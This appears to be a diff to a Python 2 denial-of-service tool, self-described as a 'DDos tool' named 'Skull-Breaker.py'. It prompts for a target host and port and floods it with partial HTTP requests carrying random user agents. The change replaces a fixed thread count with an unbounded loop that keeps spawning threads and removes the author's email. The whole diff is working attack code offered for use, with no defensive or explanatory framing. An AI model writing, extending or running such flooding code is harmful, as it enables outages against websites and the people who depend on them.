@@ -321,7 +321,7 @@ ua = [
     "Opera/9.80 (X11; Linux x86_64; U; fr) Presto/2.9.168 Version/11.50",
     "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10"
 ]
-import socket, random, threading
+import socket, random, threading, time
 print"""\033[92m
 
   ################################
@@ -329,17 +329,14 @@ print"""\033[92m
      hello there and welcome!!!
   this is Chaotic Mind's property 
   so expect an exciting experience 
-  for you with this DDos tool
+  for you with this Dos tool
 
 
   Tool:
-       http flooder.py
+      Skull-Breaker.py
       
   Author:
       Chaotic Mind 
-      
-  E-mail:
-      trap.leader.123@gmail.com
       
       
   enjoy!!!!
@@ -347,12 +344,12 @@ print"""\033[92m
   ################################  """
 u=raw_input('\n\n      TARGET:\n      (www.example.com or IP)\n      >')
 p=input('\n      PORT:\n      >')
-t=input('\n      THREADS:\n      (500<threads<1000)\n      >')
 i=0
 def k():
  global i
  i+=1
- print'\033[92mrequests sent:', i
+ if i%100==0:
+  print'requests sent:', i
 
 def so():
  try:
@@ -363,18 +360,16 @@ def so():
   s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
   s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
   k()
- except socket.error:
+ except socket.error as e:
   pass
 
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-			while True:
 			 so()
 		except Exception, ex:
 			pass
 
-for y in range(t):
+while True:
   t = HTTPThread()
   t.start()
-
